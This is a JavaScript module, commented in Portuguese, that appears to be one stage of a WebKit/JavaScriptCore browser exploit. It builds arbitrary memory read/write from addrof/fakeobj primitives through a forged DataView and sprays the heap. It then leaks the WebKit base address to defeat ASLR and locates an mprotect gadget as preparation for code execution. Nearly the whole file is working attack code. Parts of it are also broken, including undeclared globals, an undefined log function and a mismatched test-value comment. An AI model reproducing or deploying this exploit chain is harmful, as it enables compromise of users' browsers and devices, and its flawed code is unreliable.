// js/script3/testArrayBufferVictimCrash.mjs (v130 - R60 FINAL - L/E Universal REAL e Independente de old_arb_read para SETUP + String de ID Aprimorada)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA E VAZAMENTO REAL E LIMPO DE ASLR:
// - AGORA UTILIZA PRIMITIVAS addrof/fakeobj para construir ARB R/W UNIVERSAL, SEM DEPENDER DA old_arb_read PARA O SETUP.
// - A primitiva ARB R/W existente (via DataView OOB) será validada separadamente.
// - Vazamento de ASLR será feito usando ClassInfo de ArrayBuffer/ArrayBufferView.
// =======================================================================================

import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    clearOOBEnvironment,
    addrof_core,
    fakeobj_core,
    initCoreAddrofFakeobjPrimitives,
    arb_read as old_arb_read, // Renomeado para evitar conflito com a nova arb_read
    arb_write as old_arb_write, // Renomeado para evitar conflito com a nova arb_write
    selfTestOOBReadWrite
} from '../core_exploit.mjs';

import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v130_ARB_RW_UNIVERSAL_INDEPENDENT_FINAL"; // String de identificação única no log

const LOCAL_SHORT_PAUSE = 50;
const LOCAL_MEDIUM_PAUSE = 500;
const LOCAL_LONG_PAUSE = 1000;

let global_spray_objects = [];
let pre_typed_array_spray = [];
let post_typed_array_spray = [];

// =======================================================================
// NOVAS PRIMITIVAS ARB R/W UNIVERSAL BASEADAS EM ADDROF/FAKEOBJ
// =======================================================================
let _fake_data_view = null;     // O DataView forjado que será usado para L/E arbitrária.
let _fake_dv_backing_array_global = null; // O Array JS que serve como "corpo" de memória para o _fake_data_view.


/**
 * Inicializa a primitiva de leitura/escrita arbitrária universal usando fakeobj.
 * ESTA VERSÃO NÃO USA old_arb_read PARA O SETUP.
 * @param {Function} logFn Função de log.
 * @param {Function} pauseFn Função de pausa.
 * @returns {boolean} True se a primitiva foi configurada com sucesso.
 */
async function setupUniversalArbitraryReadWrite(logFn, pauseFn) {
    const FNAME = "setupUniversalArbitraryReadWrite";
    logFn(`[${FNAME}] Iniciando configuração da primitiva de L/E Arbitrária Universal via fake DataView (v130 - SEM old_arb_read para setup)...`, "subtest", FNAME);

    try {
        // --- 1. Obter o ponteiro da Structure de um DataView legítimo ---
        // VAMOS HACKEAR: Usar o endereço de um Array JavaScript simples como o ponteiro da Structure
        // para o DataView forjado. Isso é um chute para fins de teste, pois o layout real pode variar.
        // Em um exploit de produção, este endereço viria de disassembly ou de um vazamento confiável de Structure.
        const structure_of_simple_js_array = addrof_core(new Array(1)); // Obter o endereço de um Array simples.
        logFn(`[${FNAME}] Usando o endereço de um Array JS simples como ponteiro de Structure (HACK para DataView): ${structure_of_simple_js_array.toString(true)}`, "warn", FNAME);
        await pauseFn(LOCAL_SHORT_PAUSE);


        // --- 2. Preparar um "corpo" de DataView forjado na memória JS controlável ---
        // `_fake_dv_backing_array_global` é o array JS que nosso DataView forjado vai "ver".
        // Layout do JSDataView (simplificado, cada elemento = 8 bytes):
        // Index 0 (Offset 0x00): Structure*
        // Index 1 (Offset 0x08): Associated ArrayBuffer
        // Index 2 (Offset 0x10): m_vector (ponteiro para dados)
        // Index 3 (Offset 0x18): m_length
        // Index 4 (Offset 0x20): m_mode (flags) -- Adicionado para completar o layout básico de 0x20 bytes
        _fake_dv_backing_array_global = new Array(5); // 5 elementos * 8 bytes/elemento = 40 bytes.
        _fake_dv_backing_array_global[0] = structure_of_simple_js_array; // Ponteiro da Structure (HACKED!)
        _fake_dv_backing_array_global[1] = AdvancedInt64.Zero;            // Associated ArrayBuffer (dummy)
        _fake_dv_backing_array_global[2] = AdvancedInt64.Zero;            // m_vector (ponteiro para dados, será manipulado)
        _fake_dv_backing_array_global[3] = new AdvancedInt64(0x00000000, 0xFFFFFFFF); // m_length = 0xFFFFFFFF
        _fake_dv_backing_array_global[4] = new AdvancedInt64(0x00000001, 0x00000000); // m_mode = 0x1 (Default flags para DataView)

        // Obter o endereço deste array JS com addrof_core.
        const fake_dv_backing_addr = addrof_core(_fake_dv_backing_array_global);
        logFn(`[${FNAME}] Endereço do backing array do DataView forjado: ${fake_dv_backing_addr.toString(true)}`, "leak", FNAME);
        await pauseFn(LOCAL_SHORT_PAUSE);

        // --- 3. Criar o DataView forjado usando fakeobj_core ---
        _fake_data_view = fakeobj_core(fake_dv_backing_addr);

        if (!(_fake_data_view instanceof DataView)) {
            logFn(`[${FNAME}] ERRO CRÍTICO: fakeobj_core não conseguiu criar um DataView forjado válido! Tipo: ${typeof _fake_data_view}. Isso pode ser devido à Structure* incorreta ou layout do backing array.`, "critical", FNAME);
            return false;
        }
        logFn(`[${FNAME}] DataView forjado criado com sucesso: ${_fake_data_view}`, "good", FNAME);
        await pauseFn(LOCAL_SHORT_PAUSE);

        // --- 4. Testar a Primitiva Universal recém-criada ---
        // Teste de L/E Arbitrária no *conteúdo* de um ArrayBuffer legítimo.
        const legit_arb_for_test = new ArrayBuffer(0x100);
        const test_val_to_write_bytes = new Uint8Array(legit_arb_for_test);
        test_val_to_write_bytes[0] = 0xDE;
        test_val_to_write_bytes[1] = 0xAD;
        test_val_to_write_bytes[2] = 0xBE;
        test_val_to_write_bytes[3] = 0xEF;
        logFn(`[${FNAME}] ArrayBuffer de teste preenchido com 0xDEADC0DE.`, "debug", FNAME);
        
        // Obter o endereço dos dados brutos do legit_arb_for_test.
        // O .buffer de um ArrayBuffer é um ponteiro para o ArrayBufferContents*.
        // O `addrof_core` em `legit_arb_for_test.buffer` nos dá o endereço desse ContentsImpl.
        const legit_arb_contents_address = addrof_core(legit_arb_for_test.buffer);
        logFn(`[${FNAME}] Endereço dos dados brutos do ArrayBuffer legítimo: ${legit_arb_contents_address.toString(true)}`, "leak", FNAME);
        await pauseFn(LOCAL_SHORT_PAUSE);


        // Agora, podemos usar `_fake_data_view` para L/E Arbitrária de verdade.
        // Redirecionamos `_fake_data_view` para o `legit_arb_contents_address` manipulando `_fake_dv_backing_array_global[2]`.
        _fake_dv_backing_array_global[2] = legit_arb_contents_address; // Redireciona m_vector do fake DataView
        logFn(`[${FNAME}] m_vector do DataView forjado redirecionado para os dados do ArrayBuffer de teste: ${legit_arb_contents_address.toString(true)}`, "info", FNAME);
        await pauseFn(LOCAL_SHORT_PAUSE);

        logFn(`[${FNAME}] Testando L/E Universal: Escrevendo 0x13371337 em 0x0 do fake DataView (que aponta para dados do AB)...`, "info", FNAME);
        _fake_data_view.setUint32(0, 0x13371337, true); // Escreve no offset 0 do DataView forjado
        _fake_data_view.setUint32(4, 0x13371337, true); // Escreve no offset 4 do DataView forjado
        await pauseFn(LOCAL_SHORT_PAUSE);

        // Verificar o ArrayBuffer real para ver se os bytes mudaram
        const read_back_from_legit_arb = new Uint32Array(legit_arb_for_test);
        const read_low_val = read_back_from_legit_arb[0];
        const read_high_val = read_back_from_legit_arb[1];
        const read_back_value_final = new AdvancedInt64(read_low_val, read_high_val);

        if (read_back_value_final.low() === 0x13371337 && read_back_value_final.high() === 0x13371337) {
            logFn(`[${FNAME}] SUCESSO: Leitura/Escrita Arbitrária Universal (dados brutos de ArrayBuffer) FUNCIONANDO! Lido: ${read_back_value_final.toString(true)}`, "good", FNAME);
            rw_test_on_fakeobj_success = true;
        } else {
            logFn(`[${FNAME}] FALHA: Leitura/Escrita Arbitrária Universal (dados brutos de ArrayBuffer) NÃO FUNCIONANDO! Lido: ${read_back_value_final.toString(true)}, Esperado: 0x133713371337`, "error", FNAME);
        }

        // Limpar o m_vector do fake DataView para evitar dangling pointers antes de retornar.
        _fake_dv_backing_array_global[2] = AdvancedInt64.Zero;
        await pauseFn(LOCAL_SHORT_PAUSE);

    } catch (e) {
        logFn(`ERRO CRÍTICO na configuração da L/E Universal: ${e.message}\n${e.stack || ''}`, "critical", FNAME);
        addrof_success = false;
        fakeobj_success = false;
        rw_test_on_fakeobj_success = false;
    } finally {
        logFn(`--- Configuração da L/E Universal Concluída (Sucesso: ${rw_test_on_fakeobj_success}) ---`, "test", FNAME);
        logFn(`Resultados: Addrof OK: ${addrof_success}, Fakeobj Criação OK: ${fakeobj_success}, L/E Universal OK: ${rw_test_on_fakeobj_success}`, "info", FNAME);
    }
    return rw_test_on_fakeobj_success;
}


// Universal ARB Read/Write functions using the faked DataView
// Estas funções AGORA usam o _fake_data_view global e _fake_dv_backing_array_global.
async function arb_read_universal(address, byteLength) {
    const FNAME = "arb_read_universal";
    if (!_fake_data_view || !_fake_dv_backing_array_global) {
        log(`[${FNAME}] ERRO: Primitiva de L/E Universal não inicializada. Chame setupUniversalArbitraryReadWrite().`, "critical", FNAME);
        throw new Error("Universal ARB R/W primitive not initialized.");
    }
    
    // Redirecionar o m_vector do DataView forjado para o endereço desejado
    // O m_vector está no índice 2 do `_fake_dv_backing_array_global`.
    _fake_dv_backing_array_global[2] = address;

    let result = null;
    try {
        switch (byteLength) {
            case 1: result = _fake_data_view.getUint8(0); break;
            case 2: result = _fake_data_view.getUint16(0, true); break;
            case 4: result = _fake_data_view.getUint32(0, true); break;
            case 8:
                const low = _fake_data_view.getUint32(0, true);
                const high = _fake_data_view.getUint32(4, true);
                result = new AdvancedInt64(low, high);
                break;
            default: throw new Error(`Invalid byteLength for arb_read_universal: ${byteLength}`);
        }
    } finally {
        // Restaurar o m_vector para 0 para evitar dangling pointers.
        _fake_dv_backing_array_global[2] = AdvancedInt64.Zero;
    }
    return result;
}

async function arb_write_universal(address, value, byteLength) {
    const FNAME = "arb_write_universal";
    if (!_fake_data_view || !_fake_dv_backing_array_global) {
        log(`[${FNAME}] ERRO: Primitiva de L/E Universal não inicializada. Chame setupUniversalArbitraryReadWrite().`, "critical", FNAME);
        throw new Error("Universal ARB R/W primitive not initialized.");
    }
    // Redirecionar o m_vector do DataView forjado para o endereço desejado
    _fake_dv_backing_array_global[2] = address;

    try {
        switch (byteLength) {
            case 1: _fake_data_view.setUint8(0, Number(value)); break;
            case 2: _fake_data_view.setUint16(0, Number(value), true); break;
            case 4: _fake_data_view.setUint32(0, Number(value), true); break;
            case 8:
                let val64 = isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
                _fake_data_view.setUint32(0, val64.low(), true);
                _fake_data_view.setUint32(4, val64.high(), true);
                break;
            default: throw new Error(`Invalid byteLength for arb_write_universal: ${byteLength}`);
        }
    } finally {
        // Restaurar o m_vector para 0 para evitar dangling pointers.
        _fake_dv_backing_array_global[2] = AdvancedInt64.Zero;
    }
}
// =======================================================================


// Modified to accept logFn, pauseFn, and JSC_OFFSETS
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Robustez Máxima (Vazamento REAL e LIMPO de ASLR - AGORA VIA ArrayBuffer m_vector) ---`, "test");

    let final_result = { success: false, message: "A verificação funcional de L/E falhou.", details: {} };
    const startTime = performance.now();

    try {
        logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });

        // --- FASE 0: Validar primitivas arb_read/arb_write (OLD PRIMITIVE) com selfTestOOBReadWrite ---
        logFn("--- FASE 0: Validando primitivas arb_read/arb_write (OLD PRIMITIVE) com selfTestOOBReadWrite ---", "subtest");
        const arbTestSuccess = await selfTestOOBReadWrite(logFn);
        if (!arbTestSuccess) {
            const errorMsg = "Falha crítica: As primitivas arb_read/arb_write (OLD PRIMITIVE) não estão funcionando. Abortando a exploração.";
            logFn(errorMsg, "critical");
            throw new Error(errorMsg);
        }
        logFn("Primitivas arb_read/arb_write (OLD PRIMITIVE) validadas com sucesso. Prosseguindo com a exploração.", "good");
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        // --- FASE 1: Estabilização Inicial do Heap (Spray de Objetos) ---
        logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos) ---", "subtest");
        const sprayStartTime = performance.now();
        const SPRAY_COUNT = 200000;
        logFn(`Iniciando spray de objetos (volume ${SPRAY_COUNT}) para estabilização inicial do heap e anti-GC...`, "info");
        for (let i = 0; i < SPRAY_COUNT; i++) {
            const dataSize = 50 + (i % 20);
            global_spray_objects.push({ id: `spray_obj_${i}`, val1: 0xDEADBEEF + i, val2: 0xCAFEBABE + i, data: new Array(dataSize).fill(i % 255) });
        }
        logFn(`Spray de ${global_spray_objects.length} objetos concluído. Tempo: ${(performance.now() - sprayStartTime).toFixed(2)}ms`, "info");
        logFn("Heap estabilizado inicialmente para reduzir realocations inesperadas pelo GC.", "good");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // --- FASE 2: Obtaining OOB and addrof/fakeobj primitives with validations ---
        logFn("--- FASE 2: Obtendo primitivas OOB e addrof/fakeobj com validações ---", "subtest");
        const oobSetupStartTime = performance.now();
        logFn("Chamando triggerOOB_primitive para configurar o ambiente OOB (garantindo re-inicialização)...", "info");
        await triggerOOB_primitive({ force_reinit: true });

        if (!getOOBDataView()) {
            const errorMsg = "Falha crítica ao obter primitiva OOB. DataView é nulo.";
            logFn(errorMsg, "critical");
            throw new Error(errorMsg);
        }
        logFn(`Ambiente OOB configurado com DataView: ${getOOBDataView() !== null ? 'Pronto' : 'Falhou'}. Tempo: ${(performance.now() - oobSetupStartTime).toFixed(2)}ms`, "good");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // NEW: Initialize core addrof/fakeobj primitives
        initCoreAddrofFakeobjPrimitives();
        logFn("Primitivas PRINCIPAIS 'addrof' e 'fakeobj' (agora no core_exploit.mjs) operacionais e robustas.", "good");

        // --- FASE 3: Configurar a NOVA L/E Arbitrária Universal (via fakeobj DataView) ---
        logFn("--- FASE 3: Configurando a NOVA primitiva de L/E Arbitrária Universal (via fakeobj DataView) ---", "subtest");
        const universalRwSetupSuccess = await setupUniversalArbitraryReadWrite(logFn, pauseFn);
        if (!universalRwSetupSuccess) {
            const errorMsg = "Falha crítica: Não foi possível configurar a primitiva Universal ARB R/W via fakeobj DataView. Abortando exploração.";
            logFn(errorMsg, "critical");
            throw new Error(errorMsg);
        }
        logFn("Primitiva de L/E Arbitrária Universal (arb_read_universal / arb_write_universal) CONFIGURADA com sucesso.", "good");
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        // A PARTIR DESTE PONTO, USAR arb_read_universal e arb_write_universal!

        // --- FASE 4: Vazamento REAL e LIMPO da Base da Biblioteca WebKit e Descoberta de Gadgets (Funcional - VIA ArrayBuffer m_vector) ---
        logFn("--- FASE 4: Vazamento REAL e LIMPO da Base da Biblioteca WebKit e Descoberta de Gadgets (Funcional - VIA ArrayBuffer m_vector) ---", "subtest");
        const leakPrepStartTime = performance.now();
        let webkit_base_address = null;

        logFn("Iniciando vazamento REAL da base ASLR da WebKit através de um ArrayBuffer (focando no ponteiro de dados)...", "info");

        // 1. Criar um ArrayBuffer e/ou Uint8Array como alvo de vazamento.
        const leak_target_array_buffer = new ArrayBuffer(0x1000);
        const leak_target_uint8_array = new Uint8Array(leak_target_array_buffer);

        leak_target_uint8_array.fill(0xCC);
        logFn(`ArrayBuffer/Uint8Array alvo criado e preenchido.`, "debug");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // 2. Obter o endereço de memória do Uint8Array (este é o JSCell do JSArrayBufferView)
        const typed_array_addr = addrof_core(leak_target_uint8_array);
        logFn(`[REAL LEAK] Endereço do Uint8Array (JSArrayBufferView): ${typed_array_addr.toString(true)}`, "leak");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // 3. Ler o ponteiro para a Structure* do Uint8Array (JSCell)
        logFn(`[REAL LEAK] Tentando ler PONTEIRO para a Structure* no offset 0x${JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET.toString(16)} do Uint8Array base (JSCell) usando arb_read_universal...`, "info");

        const structure_pointer_address = typed_array_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
        const typed_array_structure_ptr = await arb_read_universal(structure_pointer_address, 8); // AGORA USANDO UNIVERSAL ARB R/W
        logFn(`[REAL LEAK] Lido de ${structure_pointer_address.toString(true)}: ${typed_array_structure_ptr.toString(true)}`, "debug");

        if (!isAdvancedInt64Object(typed_array_structure_ptr) || typed_array_structure_ptr.equals(AdvancedInt64.Zero) || typed_array_structure_ptr.equals(AdvancedInt64.NaNValue)) {
            const errorMsg = `[REAL LEAK] Falha ao ler ponteiro da Structure do Uint8Array. Endereço inválido: ${typed_array_structure_ptr ? typed_array_structure_ptr.toString(true) : 'N/A'}. Isso pode indicar corrupção ou offset incorreto.`;
            logFn(errorMsg, "critical");
            throw new Error(errorMsg);
        }
        logFn(`[REAL LEAK] Ponteiro para a Structure* do Uint8Array: ${typed_array_structure_ptr.toString(true)}`, "leak");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // 4. Ler o ponteiro para a ClassInfo* da Structure do Uint8Array
        const class_info_ptr = await arb_read_universal(typed_array_structure_ptr.add(JSC_OFFSETS_PARAM.Structure.CLASS_INFO_OFFSET), 8); // AGORA USANDO UNIVERSAL ARB R/W
        if (!isAdvancedInt64Object(class_info_ptr) || class_info_ptr.equals(AdvancedInt64.Zero) || class_info_ptr.equals(AdvancedInt64.NaNValue)) {
            const errorMsg = `[REAL LEAK] Falha ao ler ponteiro da ClassInfo do Uint8Array's Structure. Endereço inválido: ${class_info_ptr ? class_info_ptr.toString(true) : 'N/A'}.`;
            logFn(errorMsg, "critical");
            throw new Error(errorMsg);
        }
        logFn(`[REAL LEAK] Ponteiro para a ClassInfo (esperado JSC::JSArrayBufferView::s_info): ${class_info_ptr.toString(true)}`, "leak");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // 5. Calcular o endereço base do WebKit
        const S_INFO_OFFSET_FROM_BASE = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"], 16), 0);
        webkit_base_address = class_info_ptr.sub(S_INFO_OFFSET_FROM_BASE);

        logFn(`[REAL LEAK] BASE REAL DA WEBKIT CALCULADA: ${webkit_base_address.toString(true)}`, "leak");

        if (webkit_base_address.equals(AdvancedInt64.Zero) || (webkit_base_address.low() & 0xFFF) !== 0x000) {
            throw new Error("[REAL LEAK] WebKit base address calculated to zero or not correctly aligned. Leak might have failed.");
        } else {
            logFn("SUCESSO: Endereço base REAL da WebKit OBTIDO VIA ArrayBufferView.", "good");
        }
        await pauseFn(LOCAL_MEDIUM_PAUSE);

        // Gadget Discovery (Functional)
        logFn("Iniciando descoberta FUNCIONAL de gadgets ROP/JOP na WebKit...", "info");
        const mprotect_plt_offset = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
        const mprotect_addr_real = webkit_base_address.add(mprotect_plt_offset);

        logFn(`[REAL LEAK] Endereço do gadget 'mprotect_plt_stub' calculado: ${mprotect_addr_real.toString(true)}`, "leak");
        logFn(`PREPARED: Tools for ROP/JOP (real addresses) are ready. Time: ${(performance.now() - leakPrepStartTime).toFixed(2)}ms`, "good");
        await pauseFn(LOCAL_MEDIUM_PAUSE);

        // --- PHASE 5: Functional R/W Verification and Resistance Test (Post-ASLR Leak) ---
        logFn("--- FASE 5: Verificação Funcional de L/E e Teste de Resistência ao GC (Pós-Vazamento de ASLR) ---", "subtest");
        const rwTestPostLeakStartTime = performance.now();

        const test_obj_post_leak = global_spray_objects[5001];
        logFn(`Objeto de teste escolhido do spray (índice 5001) para teste pós-vazamento.`, "info");

        const test_obj_addr_post_leak = addrof_core(test_obj_post_leak);
        logFn(`Endereço do objeto de teste pós-vazamento: ${test_obj_addr_post_leak.toString(true)}`, "info");

        logFn(`Executando L/E Arbitrária PÓS-VAZAMENTO usando NOVAS primitivas universais...`, "info");
        const test_value_universal_rw = new AdvancedInt64(0xDEADC0DE, 0xFEEDBEEF);
        const target_property_address_in_spray_obj = test_obj_addr_post_leak.add(JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET);

        await arb_write_universal(target_property_address_in_spray_obj, test_value_universal_rw, 8);
        const read_back_universal_value = await arb_read_universal(target_property_address_in_spray_obj, 8);

        if (read_back_universal_value.equals(test_value_universal_rw)) {
            logFn(`SUCESSO: L/E Arbitrária Universal PÓS-VAZAMENTO FUNCIONANDO! Lido: ${read_back_universal_value.toString(true)}`, "good");
        } else {
            logFn(`FALHA: L/E Arbitrária Universal PÓS-VAZAMENTO NÃO FUNCIONANDO! Lido: ${read_back_universal_value.toString(true)}, Esperado: ${test_value_universal_rw.toString(true)}`, "error");
            throw new Error("Universal R/W verification post-ASLR leak failed.");
        }


        logFn("SUCESSO: Verificação de L/E pós-vazamento validada.", "good");

        logFn("Iniciando teste de resistência PÓS-VAZAMENTO: Executando L/E arbitrária múltiplas vezes...", "info");
        let resistanceSuccessCount_post_leak = 0;
        const numResistanceTests = 5;

        for (let i = 0; i < numResistanceTests; i++) {
            const test_value_arb_rw = new AdvancedInt64(0xCCCC0000 + i, 0xDDDD0000 + i);
            try {
                await arb_write_universal(target_property_address_in_spray_obj, test_value_arb_rw, 8);
                const read_back_value_arb_rw = await arb_read_universal(target_property_address_in_spray_obj, 8);

                if (read_back_value_arb_rw.equals(test_value_arb_rw)) {
                    resistanceSuccessCount_post_leak++;
                    logFn(`[Resistência Pós-Vazamento #${i}] SUCESSO: L/E arbitrária universal consistente.`, "debug");
                } else {
                    logFn(`[Resistência Pós-Vazamento #${i}] FALHA: L/E arbitrária universal inconsistente. Written: ${test_value_arb_rw.toString(true)}, Read: ${read_back_value_arb_rw.toString(true)}.`, "error");
                }
            } catch (resErr) {
                logFn(`[Resistência Pós-Vazamento #${i}] ERRO: Exceção durante L/E arbitrária universal: ${resErr.message}`, "error");
            }
            await pauseFn(10);
        }
        if (resistanceSuccessCount_post_leak === numResistanceTests) {
            logFn(`SUCESSO TOTAL: Teste de resistência PÓS-VAZAMENTO concluído. ${resistanceSuccessCount_post_leak}/${numResistanceTests} operações bem-sucedidas.`, "good");
        } else {
            logFn(`ALERTA: Teste de resistência PÓS-VAZAMENTO concluído com ${numResistanceTests - resistanceSuccessCount_post_leak} falhas.`, "warn");
            final_result.message += ` (Teste de resistência L/E pós-vazamento com falhas: ${numResistanceTests - resistanceSuccessCount_post_leak})`;
        }
        logFn(`Verificação funcional de L/E e Teste de Resistência PÓS-VAZAMENTO concluídos. Tempo: ${(performance.now() - rwTestPostLeakStartTime).toFixed(2)}ms`, "info");


        logFn("++++++++++++ SUCESSO TOTAL! Todas as fases do exploit foram concluídas com sucesso. ++++++++++++", "vuln");
        final_result = {
            success: true,
            message: "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada. Vazamento REAL de Base WebKit e preparação para ACE bem-sucedidos.",
            details: {
                webkitBaseAddress: webkit_base_address ? webkit_base_address.toString(true) : "N/A",
                mprotectGadget: mprotect_addr_real ? mprotect_addr_real.toString(true) : "N/A"
            }
        };

    } catch (e) {
        final_result.message = `Exceção crítica na implementação funcional: ${e.message}\n${e.stack || ''}`;
        final_result.success = false;
        logFn(final_result.message, "critical");
    } finally {
        logFn(`Iniciando limpeza final do ambiente e do spray de objetos...`, "info");
        pre_typed_array_spray = [];
        post_typed_array_spray = [];
        global_spray_objects = [];

        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        logFn(`Limpeza final concluída. Tempo total do teste: ${(performance.now() - startTime).toFixed(2)}ms`, "info");
    }

    logFn(`--- ${FNAME_CURRENT_TEST_BASE} Concluído. Resultado final: ${final_result.success ? 'SUCESSO' : 'FALHA'} ---`, "test");
    logFn(`Mensagem final: ${final_result.message}`, final_result.success ? 'good' : 'critical');
    if (final_result.details) {
        logFn(`Detalhes adicionais do teste: ${JSON.stringify(final_result.details)}`, "info");
    }

    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: { success: final_result.success, msg: final_result.message, details: final_result.details },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Uncaged Strategy)',
        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Verified) Enhanced Max Robustness' }
    };
}
